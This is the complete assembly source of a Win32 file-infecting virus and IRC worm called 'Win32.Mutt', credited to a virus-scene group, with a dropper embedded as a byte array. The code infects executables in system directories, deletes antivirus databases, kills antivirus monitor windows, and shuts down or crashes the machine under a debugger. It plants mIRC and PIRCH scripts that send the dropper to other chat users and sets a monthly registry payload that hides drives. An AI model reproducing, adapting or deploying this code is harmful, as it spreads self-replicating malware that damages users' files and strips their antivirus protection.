

;     Virus Name : Win32.Mutt
;  Virus Version : 1.1 (not beta)
;   Virus Author : ULTRAS[MATRiX]
;   Release Date : 17.07.00
;         Origin : Russia
;     Virus type : PE infector
;      Target OS : Win95, Win98, WinNT
;   Target Files : PE (EXE,CPL,SCR,OCX) & mIRC and PIRCH scriptz
;     Infection  : Last section (i`m lazy)
;    Polymorphic : No
;      Encrypted : No
;        Kill AV : Yes (monitor & av filez)
;       Features : 
;		  Infect PE files in current, Windows, and System dirs.
;		  Anti-Debugging features (DebugBreak & IsDebuggerPresent).
;		  Anti-Emulation features
;		  IRC w0rm virus: mIRC, PIRCH scripts.
;		  Removes many AV CRC & base files.
;		  Kill AV monitorz
;
;        Payload : will remove the disk from the my computer using 
;                  the registery & small messsage box - at 15 every 
;                  month.
;
;      KnownBugs : + Two mistakes are found
;		   - Not optimizated(i`m lazy)
;		   
;
;                  Win32.Mutt by ULTRAS [MATRiX]

		.486p
		.model flat,stdcall

extrn	MessageBoxA:proc
extrn	ExitProcess:proc

		.data
_title          db      "[Win32.Mutt."
                db      all_size/01000 mod 10 + "0"
                db      all_size/00100 mod 10 + "0"
                db      all_size/00010 mod 10 + "0"
                db      all_size/00001 mod 10 + "0"
                db      "]",0
_message        db      "First generation host#",10
                db      "(c) 2000 [ULTRAS/MATRiX]",0

		.code

start:		push	0
		push	offset _title
		push	offset _message
		push	0
		call	MessageBoxA
		push	0
		call	ExitProcess

TRUE            EQU     1
FALSE           EQU     0
DEBUG           EQU     FALSE

header_s 	equ 60h
obj_size 	equ 28h
dta_size 	equ 22ch

vstart:		db 68h
retadd		dd offset start

	call geteip
geteip:	
 mov ebp,[esp]
 sub ebp,offset geteip
 add esp,4
 
 ; Windoze 95/98?

 mov eax,0bff70000h
 cmp word ptr [eax],"ZM"
 je good_os

 ; Windoze NT?

 mov eax,077f00000h
 cmp word ptr [eax],"ZM"
 je good_os

 ;Windoze 2000?

 mov eax,077e00000h
 cmp word ptr [eax],"ZM"
 jne error

good_os:
 mov [ebp+kernel], eax	; save kernel adress
 mov esi,eax
 add esi,[esi+3ch]
 cmp word ptr [esi], "EP"	; is it a PE?
 jne @exit
 mov esi,[esi+120]
 add esi,eax
 mov edi,[esi+36]
 add edi,eax
 mov [ebp+ordin_tab],edi
 mov edi,[esi+32]
 add edi,eax
 mov [ebp+name_tab],edi
 mov ecx,[esi+24]
 mov esi,[esi+28]
 add esi,eax
 mov [ebp+adrtbl],esi
 xor edx,edx
 lea esi,[ebp+apiz]
 mov [ebp+o_api],esi
 lea eax,[ebp+win32apiz]
 mov [ebp+cur_api], eax

nextz_api:
 mov esi,[ebp+o_api]
 mov ebx,[esi]
 add ebx,ebp
 mov esi,[edi]
 add esi,[ebp+kernel]

cmp_apiz:
 lodsb    
 cmp al,[ebx]
 jnz not_our_API
 cmp al,0
 jz is_our_API
 inc ebx
 jmp cmp_apiz

not_our_API:	
 inc edx
 cmp edx,ecx
 jz @exit
 add edi,4
 mov esi,[ebp+o_api]
 jmp nextz_api

is_our_API:	
 mov edi,[ebp+ordin_tab]
 push ecx
 push edx
 xchg edx,eax
 add eax,eax
 add edi,eax
 mov ax,[edi]
 xor edx, edx
 mov ecx,4
 mul ecx
 mov edi,[ebp+adrtbl]
 add edi,eax
 mov eax,edi
 sub eax,[ebp+kernel]
 mov [ebp+org_rva],eax
 mov eax,[edi]
 mov [ebp+org_rva_],eax
 add eax,[ebp+kernel]
 mov edi,[ebp+cur_api]
 mov [edi],eax
 add edi,4
 mov [ebp+cur_api],edi
 pop edx
 pop ecx
 mov edi,[ebp+name_tab]
 mov esi,[ebp+o_api]
 add esi,4
 mov [ebp+o_api],esi
 cmp [esi],dword ptr 0
 jz found_all
 mov edi,[ebp+name_tab]
 xor edx,edx
 jmp nextz_api

found_all:
 IF DEBUG                               ; Anti-debugging !!
 ELSE
 call @Debugger
 db 'IsDebuggerPresent',0               ; load IsDebuggerPresent API
	
 ; This api is not present in windoze 95 
 ; and we should do(make) so to avoid mistakes...

@Debugger:
 push [ebp+k32]
 call [ebp+_GetProcAddress]
 or eax,eax				; Windoze95?
 jz  @continue_
 call eax				; call apiz
 ;call [ebp+_IsDebuggerPresent]
 or eax,eax
 jne shut_down
 jmp @continue_
shut_down:
 call user_32_				; get user32.dll api
 db 'USER32.DLL',00h
user_32_:
 call dword ptr [ebp+_LoadLibraryA]	; load library user32.dll
 call exitwindows
 db 'ExitWindowsEx',00h
exitwindows:
 push eax
 call dword ptr [ebp+_GetProcAddress]
 push 0
 push 02h or 04h or 08h or 10h
 ;call [ebp+_ExitWindowsEx]             ; close windoze
 call eax
 ENDIF

@continue_:
 call api                               ; get USER32 & ADVAPI32 api
 call infect_dir                        ; Infect Current Directory
 call anti                              ; Anti-debugging !!
 call payload                           ; Small&Simple Payload
 call infectwindirectory                ; Infect all filez in Windoze directory
 call infectsysdirectory                ; Infect all filez in System directory
 call dr0p				; Create Virii Dropper
 call kill_monitorz			; Kill AV Monitorz
error:	
 ret

infect:		
 push 0
 push dword ptr [dta_+00h+ebp]
 push 3
 push 0
 push 0
 push 0C0000000h
 lea eax,[dta_+2ch+ebp]
 push eax
 call [ebp+_CreateFileA]
 cmp eax,0ffffffffh
 je @exit
 mov ebx, eax

 push 0
 push 0
 push 3ch
 push ebx
 call [ebp+_SetFilePointer]

 push 0
 lea eax,[bytez+ebp]
 push eax
 push 2
 lea eax,[header_o+ebp]
 push eax
 push ebx
 call [ebp+_ReadFile]

 push 0
 push 0
 push dword ptr [header_o+ebp]
 push ebx
 call [ebp+_SetFilePointer]

 push 0
 lea eax,[bytez+ebp]
 push eax
 push header_s
 lea eax,[headerz+ebp]
 push eax
 push ebx
 call [ebp+_ReadFile]

 cmp dword ptr [headerz+00h+ebp],'EP'   ; PE file?
 jne close_file
 cmp [headerz+4Ch+ebp],'ttuM'           ; already infected?
 je close_file

 mov eax,[headerz+34h+ebp]
 add eax,[headerz+28h+ebp]
 mov [retadd+ebp], eax

 movzx eax,word ptr [headerz+06h+ebp]
 dec eax
 mov ecx,40
 mul ecx
 add eax,18h
 add ax,word ptr [headerz+14h+ebp]
 add eax,[header_o+ebp]
 mov [objectOfs+ebp], eax

 push 0
 push 0
 push eax
 push ebx
 call [ebp+_SetFilePointer]

 push 0
 lea eax,[bytez+ebp]
 push eax
 push obj_size
 lea eax,[object+ebp]
 push eax
 push ebx
 call [ebp+_ReadFile]

 mov edx,[dta_+1ch+ebp]
 mov eax,[dta_+20h+ebp]
 mov ecx,[headerz+3ch+ebp]
 div ecx
 or edx,edx
 jz $+3
 inc eax
 mul ecx
 shl edx,16
 add edx,eax
 push edx

 push 0
 push 0
 push edx
 push ebx
 call [ebp+_SetFilePointer]

 push 0
 lea eax,[bytez+ebp]
 push eax
 push all_size
 lea eax,[vstart+ebp]
 push eax
 push ebx
 call [ebp+_WriteFile]

 pop edx
 sub edx,[object+14h+ebp]
 mov [object+10h+ebp],edx
 mov eax,[object+0Ch+ebp]
 add eax,[object+10h+ebp]
 mov [headerz+28h+ebp],eax
 xor edx,edx
 mov eax,all_size
 mov ecx,[headerz+3Ch+ebp]
 div ecx
 or edx,edx
 jz $+3
 inc eax
 mul ecx
 mov edi,[object+10h+ebp]

 add eax,[object+10h+ebp]
 mov [object+10h+ebp],eax
 xor edx,edx
 mov eax,vir_size
 mov ecx,[headerz+38h+ebp]
 div ecx
 inc eax
 mul ecx
 mov esi,[object+08h+ebp]

 cmp esi,edi
 jb x1
 add eax,esi
 jmp x2
x1:	
 add eax,edi
x2:
 mov [object+08h+ebp],eax
 mov [object+24h+ebp],0E0000040h
 mov eax,[object+08h+ebp]
 add eax,[object+0ch+ebp]
 mov [headerz+50h+ebp],eax
 mov [headerz+4ch+ebp],'ttuM'

 push 0
 push 0
 push dword ptr [header_o+ebp]
 push ebx
 call [ebp+_SetFilePointer]

 push 0
 lea eax,[bytez+ebp]
 push eax
 push header_s
 lea eax,[headerz+ebp]
 push eax
 push ebx
 call [ebp+_WriteFile]

 push 0
 push 0
 push dword ptr [objectOfs+ebp]
 push ebx
 call [ebp+_SetFilePointer]

 push 0
 lea eax,[bytez+ebp]
 push eax
 push obj_size
 lea eax,[object+ebp]
 push eax
 push ebx
 call [ebp+_WriteFile]

close_file:	
 push ebx
 call [_CloseHandle+ebp]

@exit:	
 ret

dr0p:
 pusha
 push 00h
 push 80h
 push 02h
 push 00h
 push 01h
 push 0C0000000h
 lea eax,[ebp+dr0pz]
 push eax
 call [ebp+_CreateFileA]
 mov ebx,eax

 push 0
 lea eax,[nbyte+ebp]
 push eax
 push size_dr0p
 lea eax,[ebp+drop]
 push eax
 push ebx
 call [ebp+_WriteFile]

 push ebx
 call [ebp+_CloseHandle]

 lea eax,[ebp+drive_f]
 push eax
 call [ebp+_SetCurrentDirectoryA]
 ;call infect_dir
 lea ecx,[dta_+ebp]
 lea edx,[dr0pz+ebp]
 call infect_folder

 push 00000001h or 00000002h  	; set read only and hidden
 lea eax,[ebp+dr0pz]
 push eax
 call [ebp+_SetFileAttributesA]  ; set mutt.exe new attributes
 popa
 ret

drive_f         db      'C:\',0
fhandle   	dd      00000000h
size_dr0p 	equ 	drop2-drop
dr0pz 	  	db      "c:\Mutt.exe",0
nbyte     	dd      ?
include	  	dr0p.inc



payload proc
 lea  eax,[ebp+SYSTEMTIME]
 push eax
 call [ebp+_GetSystemTime]

 cmp word ptr [ebp+ST_wDay],15        ; 15?
 jnz no_payload			     ; n0? suxxx

payloadz:

 ; HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer

 lea eax,dword ptr [ebp+offset key_handle]
 push eax
 push KEY_SET_VALUE
 push 0
 lea eax,dword ptr [ebp+offset KEYZ]
 push eax
 push HKEY_LOCAL_MACHINE
 call [ebp+_RegOpenKeyExA]

 ; set key Nodrives = 3

 push 00000002h
 lea eax,[ebp+kz_data]
 push eax
 push REG_SZ
 push 0
 lea eax,dword ptr [ebp+key_name]
 push eax
 mov eax,dword ptr [ebp+key_handle]
 push eax
 call [ebp+_RegSetValueExA]

 push 00000000h
 call [ebp+_RegCloseKey]

 ; small message & greetz

 push 00001010h
 lea eax,[ebp+mark_]
 push eax
 call _mes

 db "Mutt by ULTRAS[MATRiX] (c) 2000",13,13
 db "Thanx: [MATRiX] VX TeAm: mort, NBK, anaktos, Del_Armg0, Lord Dark...",13,13
 db "Greetz: all VX scene",0

_mes:   
 push 00000000h
 call [ebp+ _MessageBoxA]
no_payload:
 ret
payload endp


HKEY_LOCAL_MACHINE  equ  80000002h
HKEY_CURRENT_USER   equ  80000001h
KEY_SET_VALUE       equ  00000002h
KEYZ   		    db   "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",0h
key_handle  	    dd   0
kz_data             db   "03",0h
key_name            db   "Nodrives",0h
REG_SZ              equ  1

; DebugBreak procedure
; tnx NBK [MATRiX]

anti proc
 pushad
 push ebp
 lea eax,[ebp+offset anti1]
 push eax
 push dword ptr fs:[0]
 mov dword ptr fs:[0],esp
 call [ebp+_DebugBreak]  
 jmp fuck
anti1:
 mov esp,dword ptr [esp+8]
 pop dword ptr fs:[0]
 add esp,4
 pop ebp
 popad
 ret
anti endp

; DiE-DiE-DiE!!!
fuck proc
 mov eax,12345678h
 call $
 mov ecx,071h
fuck_esp:
 mov dword ptr [esp],0b0b0b0b0h
 add esp,4
 loop fuck_esp
 call $
fuck endp                                    

mark_   db      "[Win32.Mutt v1.00]",0

infect_folder proc
 push ecx
 ;lea ecx,[dta_+ebp]
 push ecx
 push edx
 call [_FindFirstFileA+ebp]
 pop ecx
 cmp eax,0ffffffffh
 je endz_find
 push eax
@@infect:
 call infect
find_next:
 pop eax
 push eax
 push eax
 pop ecx
 lea edx,[dta_+ebp]
 push edx
 push ecx
 call [_FindNextFileA+ebp]
 test eax,eax
 jz find_close
 lea ecx,[dta_+ebp+ebp]
 jmp @@infect
find_close:
 call [ebp+_FindClose]
endz_find:
 ret
infect_folder endp


infectwindirectory proc
 lea edx,[infection_dir_@1+ebp]
 push edx
 push 7Fh
 push edx
 call [_GetWindowsDirectoryA+ebp]
 pop edx
 push edx
 call [ebp+_SetCurrentDirectoryA]
 call infect_dir
 ret
infectwindirectory endp

infectsysdirectory proc
 lea edx,[infection_dir_@2+ebp]
 push edx
 push 7Fh
 push edx
 call [_GetSystemDirectoryA+ebp]
 pop edx
 push edx
 call [ebp+_SetCurrentDirectoryA]
 call infect_dir
 ret
infectsysdirectory endp

mtx	db	"[MATRiX4EVER]",0

; Search&Infect current directory EXE, CPL, SCR filez..

infect_dir proc
 call delete_av				; delete av filez
 lea ecx,[dta_+ebp]			; find EXE filez
 lea edx,[fexe+ebp]
 call infect_folder			; Infect the folder
 lea ecx,[dta_+ebp]			; find SCR filez
 lea edx,[fscr+ebp]
 call infect_folder			; Infect the folder
 lea ecx,[dta_+ebp]			; find CPL filez
 lea edx,[fcpl+ebp]
 call infect_folder			; Infect the folder
 lea ecx,[dta_+ebp]			; find OCX filez
 lea edx,[focx+ebp]
 call infect_folder			; Infect the folder
 call irc_worm				; search mirc & pirch
 ret
infect_dir endp

; Delete AV checksum & database

delete_av proc
 lea ebx,[ebp+avp_crc]
 call delete_
 lea ebx,[ebp+anti_vir]
 call delete_
 lea ebx,[ebp+chklist]
 call delete_
 lea ebx,[ebp+ivb]
 call delete_
 lea ebx,[ebp+nod]
 call delete_
 lea ebx,[ebp+tbscan]
 call delete_
 lea ebx,[ebp+ap]
 call delete_
 ret
delete_av endp

; Delete Procedure
; EBX = filename to kill

delete_ proc
  push 80h
  push ebx					; set attribute
  call dword ptr [ebp+_SetFileAttributesA]
  push ebx
  call dword ptr [ebp+_DeleteFileA]		; kill filez
  ret
delete_ endp

fbytez	db 05h

irc_worm:
 push 80h
 lea eax,[ebp+_mircfilez]
 push eax
 call [ebp+_SetFileAttributesA]
 xchg eax,ecx
 jecxz _pirch
 jmp inf_mirc
_pirch:
 push 80h
 lea eax,[ebp+_pirchfile]
 push eax
 call [ebp+_SetFileAttributesA]
 xchg eax,ecx
 jecxz exitscp
 jmp inf_pirch
exitscp:
 ret

inf_pirch:
 xor eax,eax
 push eax
 push eax
 push 00000003h
 push eax
 inc eax
 push eax
 push 40000000h
 call _pirchz
_pirchfile db "events.ini",0
_pirchz:
 call [ebp+_CreateFileA]
 mov dword ptr [ebp+script_hnd],eax
 push 00000000h
 lea ebx,[ebp+fbytez]
 push ebx
 push p_wrmsize
 lea ebx,[ebp+pirch_script]
 push ebx
 push eax
 call [ebp+_WriteFile]
 push dword ptr [ebp+script_hnd]
 call [ebp+_CloseHandle]
 ret

inf_mirc:
 xor eax,eax
 push eax
 push eax
 push 00000003h
 push eax
 inc eax
 push eax
 push 0c0000000h
 call _mirc
_mircfilez db "script.ini",0
_mirc:  
 call [ebp+_CreateFileA]
 mov dword ptr [ebp+script_hnd],eax
 push 00000000h
 lea ebx,[ebp+fbytez]
 push ebx
 push m_wrmsize
 lea ebx,[ebp+mirc_script]
 push ebx
 push eax
 call [ebp+_WriteFile]
 push dword ptr [ebp+script_hnd]
 call [ebp+_CloseHandle]
 ret

script_hnd      dd      00000000h

api:
 lea eax,[ebp+user32_]
 push eax
 call [ebp+_LoadLibraryA]
 xchg eax,ebx
 lea edi,[ebp+@user_api]
 lea esi,[ebp+@user_add]
retrieve_user32_api:   
 push edi
 push ebx
 call [ebp+_GetProcAddress]
 xchg edi,esi
 stosd
 xchg edi,esi
 xor al,al
 scasb
 jnz $-1
 cmp byte ptr [edi],"M"
 jz user32api
 jmp retrieve_user32_api
user32api:
 lea eax,[ebp+advapi32_]
 push eax
 call [ebp+_LoadLibraryA]
 xchg eax,ebx
 lea edi,[ebp+@advapi32_api]
 lea esi,[ebp+@advapi32_add]
retrieve_advapi32_api:
 push edi
 push ebx
 call [ebp+_GetProcAddress]
 xchg edi,esi
 stosd           
 xchg edi,esi
 xor al,al
 scasb
 jnz $-1
 cmp byte ptr [edi],"U"
 jz retz
 jmp retrieve_advapi32_api
retz:
 ret


kill_monitorz:
 lea edi,[ebp+avmonitorz]
l00pz:
 call terminate_mon
 xor al,al
 scasb
 jnz $-1
 cmp byte ptr [edi],0FFh
 jnz l00pz
 ret

terminate_mon proc
 xor ebx,ebx
 push edi
 push ebx
 call [ebp+_FindWindowA]
 xchg eax,ecx
 jecxz tm_error
 push ebx
 push ebx
 push 00000012h
 push ecx
 call [ebp+_PostMessageA]
 mov cl,00h
 org $-1
tm_error:
 stc
 ret
terminate_mon endp

avmonitorz label   byte
 db     "AVP Monitor",0
 db     "Amon Antivirus Monitor",0
 db	"AVG Control Center",0
 db	"Avast32 -- Rezidentný podpora",0
 db	"AVP Monitor",0
 db	"Amon Antivirus Monitor",0
 db	"Antivýrusov¤ monitor Amon",0
 db     "Norton AntiVirus",0
 db      0FFh

@user_add label   byte
_MessageBoxA            dd      00000000h
_FindWindowA            dd      00000000h
_PostMessageA           dd      00000000h

@advapi32_add label   byte
_RegCreateKeyExA        dd      00000000h
_RegOpenKeyExA          dd      00000000h
_RegSetValueExA         dd      00000000h
_RegCloseKey            dd      00000000h

@user_api  label   byte
@MessageBoxA            db      "MessageBoxA",0
@FindWindowA            db      "FindWindowA",0
@PostMessageA           db      "PostMessageA",0
			db      "M"

@advapi32_api label   byte
@RegCreateKeyExA        db      "RegCreateKeyExA",0
@RegOpenKeyExA          db      "RegOpenKeyExA",0
@RegSetValueExA         db      "RegSetValueExA",0
@RegCloseKey            db      "RegCloseKey",0
			db      "U"
; AV filez
avp_crc	        db      'AVP.CRC',0
anti_vir        db      'ANTI-VIR.DAT',0
chklist        	db      'CHKLIST.MS',0
ivb        	db      'IVB.NTZ',0
nod          	db      'NOD32.000',0
tbscan          db      'TBSCAN.SIG',0
ap           	db      'AP.VIR',0

infection_dir_@1 db      7Fh dup (00h)
infection_dir_@2 db      7Fh dup (00h)

apiz:		dd	offset CreateFile
		dd	offset SetFilePtr
		dd	offset ReadFile
		dd	offset WriteFile
		dd	offset CloseFile
		dd	offset FindFirst
		dd	offset FindNext
		dd	offset FindC
		dd	offset GSTime
		dd	offset GProcAd
		dd	offset LoadLib
		dd	offset FrLib
		dd	offset GetWin
		dd	offset GetSys
		dd	offset SetDir
		dd	offset GetDir
		dd	offset SetAtt
		dd	offset Delete
		dd	offset DebugB
		dd	0

CreateFile	db	'CreateFileA',0
SetFilePtr	db	'SetFilePointer',0
ReadFile	db	'ReadFile',0
WriteFile	db	'WriteFile',0
CloseFile	db	'CloseHandle',0
FindFirst	db	'FindFirstFileA',0
FindNext	db	'FindNextFileA',0
FindC		db	'FindClose',0
CopyF		db	'CopyFileA',0	
GSTime		db	'GetSystemTime',0
GProcAd		db	'GetProcAddress',0 ;
LoadLib		db	'LoadLibraryA',0
FrLib		db	'FreeLibrary',0
GetWin		db	'GetWindowsDirectoryA',0
GetSys		db	'GetSystemDirectoryA',0
SetDir		db	'SetCurrentDirectoryA',0
GetDir		db	'GetCurrentDirectoryA',0
SetAtt		db	'SetFileAttributesA',0
Delete		db	'DeleteFileA',0
DebugB		db	'DebugBreak',0
ExitProc	db	'ExitProcess',0


win32apiz:
_CreateFileA			dd	0
_SetFilePointer			dd	0
_ReadFile			dd	0
_WriteFile			dd	0
_CloseHandle			dd	0
_FindFirstFileA			dd	0
_FindNextFileA			dd	0
_FindClose			dd	0
_GetSystemTime   		dd	0
_GetProcAddress   		dd	0
_LoadLibraryA			dd	0
_FreeLibrary 			dd	0
_GetWindowsDirectoryA		dd	0
_GetSystemDirectoryA		dd	0
_SetCurrentDirectoryA		dd	0
_GetCurrentDirectoryA		dd	0
_SetFileAttributesA		dd	0
_DeleteFileA			dd	0
_DebugBreak			dd	0
_ExitProcess			dd	0

; Systemtime strycture

SYSTEMTIME              label   byte
ST_wYear                dw      ?
ST_wMonth               dw      ?
ST_wDayOfWeek           dw      ?
ST_wDay                 dw      ?
ST_wHour                dw      ?
ST_wMinute              dw      ?
ST_wSecond              dw      ?
ST_wMilliseconds        dw      ?


; mIRC virus script

mirc_script     db      "[script]",13,10
		db      "; -=Mutt=-",13,10
		db      "n0=on 1:join:#:{",13,10
		db      "n1=if ( $nick == $me ) { halt } | .dcc send $nick c:\mutt.exe",13,10
		db      "n2=}",13,10
		db      "n3=ON 1:TEXT:*virus*:#:/.ignore $nick",13,10
		db      "n4=ON 1:TEXT:*worm*:#:/.ignore $nick",13,10
		db      "n5=ON 1:TEXT:*mutt*:#:/.ignore $nick",13,10
		db      "n6=ON 1:TEXT:*exe*:#:/.ignore $nick",13,10
		db      "n7=ON 1:TEXT:*blink*:#:/quit Blink 182!!!!!",13,10
		db      "n8=ON 1:CONNECT: {",13,10
		db      "n9=}",13,10
m_wrmsize    equ     ($-offset mirc_script)


; PIRCH virus script

pirch_script    db      "[Levels]",13,10
		db      "Enabled=1",13,10
		db      "; -=Mutt=-",13,10
		db      "Count=1",10
		db      "Level1=UltraMutt",13,10,13,10
		db      "[UltraMutt]",13,10
		db      "User1=*!*@*",13,10
		db      "UserCount=1",13,10
		db      "Event1=ON JOIN:#:/dcc send $nick c:\mutt.exe",13,10
		db      "Event2=ON TEXT:*virus*:*:/ignore $nick 1",13,10
		db      "Event3=ON TEXT:*worm*:*:/ignore $nick 1",13,10
		db      "Event4=ON TEXT:*mutt*:*:/ignore $nick 1",13,10
		db      "Event5=ON TEXT:*exe*:*:/ignore $nick 1",13,10
		db      "EventCount=5",13,10
	        db 	"[DCC]",13,10
	        db 	"AutoHideDccWin=1",13,10
p_wrmsize   equ     ($-offset pirch_script)

fexe            db 	"*.EXE",0
;fult            db 	"*.mtx",0
fscr            db 	"*.SCR",0
fcpl            db 	"*.CPL",0
focx		db 	"*.OCX",0

k32		    	dd 0
user32_        db      "USER32",0
advapi32_      db      "ADVAPI32",0
all_size	equ	$-vstart
name_tab	dd	?
adrtbl		dd	?
o_api	        dd	?
cur_api	        dd	?
ordin_tab	dd	?
org_rva         dd	?
org_rva_        dd	?
kernel	        dd	?
header_o	dd	?
objectOfs	dd	?
SearchHandle	dd	?
bytez		dd	?
object		dd	obj_size/4 dup (?)
headerz		dd	header_s/4 dup (?)
dta_		dd	dta_size/4 dup (?)

vir_size	equ	$-vstart

		end	vstart


--[dr0p.inc]------------------------------------------------------------------>8

; DirectDrow Demo "Plazma"
; Virus Dropper

drop:
db  04Dh,05Ah,090h,000h,003h,000h,000h,000h,004h,000h,000h,000h,0FFh,0FFh
db  000h,000h,0B8h,000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,0B0h,000h,000h,000h,00Eh,01Fh,0BAh,00Eh,000h,0B4h
db  009h,0CDh,021h,0B8h,001h,04Ch,0CDh,021h,054h,068h,069h,073h,020h,070h
db  072h,06Fh,067h,072h,061h,06Dh,020h,063h,061h,06Eh,06Eh,06Fh,074h,020h
db  062h,065h,020h,072h,075h,06Eh,020h,069h,06Eh,020h,044h,04Fh,053h,020h
db  06Dh,06Fh,064h,065h,02Eh,00Dh,00Dh,00Ah,024h,000h,000h,000h,000h,000h
db  000h,000h,05Dh,017h,01Dh,0DBh,019h,076h,073h,088h,019h,076h,073h,088h
db  019h,076h,073h,088h,019h,076h,073h,088h,007h,076h,073h,088h,0E5h,056h
db  061h,088h,018h,076h,073h,088h,052h,069h,063h,068h,019h,076h,073h,088h
db  000h,000h,000h,000h,000h,000h,000h,000h,050h,045h,000h,000h,04Ch,001h
db  003h,000h,034h,01Fh,096h,038h,000h,000h,000h,000h,000h,000h,000h,000h
db  0E0h,000h,00Fh,001h,00Bh,001h,006h,000h,000h,006h,000h,000h,000h,014h
db  000h,000h,000h,000h,000h,000h,000h,010h,000h,000h,000h,010h,000h,000h
db  000h,020h,000h,000h,000h,000h,040h,000h,000h,010h,000h,000h,000h,002h
db  000h,000h,004h,000h,000h,000h,000h,000h,000h,000h,004h,000h,000h,000h
db  000h,000h,000h,000h,000h,040h,000h,000h,000h,004h,000h,000h,000h,000h
db  000h,000h,002h,000h,000h,000h,000h,000h,010h,000h,000h,010h,000h,000h
db  000h,000h,010h,000h,000h,010h,000h,000h,000h,000h,000h,000h,010h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,054h,020h,000h,000h
db  064h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,020h,000h,000h,054h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,02Eh,074h,065h,078h,074h,000h,000h,000h,09Ah,005h
db  000h,000h,000h,010h,000h,000h,000h,006h,000h,000h,000h,004h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,020h,000h
db  000h,060h,02Eh,072h,064h,061h,074h,061h,000h,000h,056h,002h,000h,000h
db  000h,020h,000h,000h,000h,004h,000h,000h,000h,00Ah,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,040h
db  02Eh,064h,061h,074h,061h,000h,000h,000h,04Ch,00Eh,000h,000h,000h,030h
db  000h,000h,000h,002h,000h,000h,000h,00Eh,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,0C0h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,06Ah,000h,0E8h,039h,005h,000h,000h,06Ah,00Ah,06Ah,000h,06Ah
db  000h,050h,0E8h,0ADh,001h,000h,000h,050h,0E8h,021h,005h,000h,000h,053h
db  056h,057h,0B9h,0C8h,000h,000h,000h,08Bh,03Dh,000h,032h,040h,000h,051h
db  057h,08Bh,035h,0A0h,030h,040h,000h,08Bh,015h,0A4h,030h,040h,000h,02Bh
db  0F1h,081h,0E2h,0FFh,000h,000h,000h,081h,0E6h,0FFh,000h,000h,000h,08Bh
db  014h,095h,04Ch,03Ah,040h,000h,08Bh,034h,0B5h,04Ch,036h,040h,000h,02Bh
db  0D1h,0B9h,040h,001h,000h,000h,081h,0E6h,0FFh,000h,000h,000h,081h,0E2h
